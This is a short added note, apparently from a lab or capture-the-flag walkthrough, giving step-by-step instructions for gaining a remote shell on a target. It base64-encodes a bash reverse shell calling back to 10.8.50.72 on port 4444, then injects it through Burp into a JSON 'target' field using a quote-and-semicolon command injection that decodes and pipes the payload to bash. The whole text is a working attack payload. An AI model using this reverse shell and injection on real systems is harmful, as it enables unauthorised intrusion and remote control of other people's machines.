@@ -1,0 +1,8 @@
+first use echo to echo your bash reverse shell into a base64 format
+
+echo -n "bash -i >& /dev/tcp/10.8.50.72/4444 0>&1" | base64
+
+Now open burp and intercept request, put the following in that request
+
+{"target":"\";echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjUwLjcyLzQ0NDQgMD4mMQ== | base64 -d | bash; \""}
+
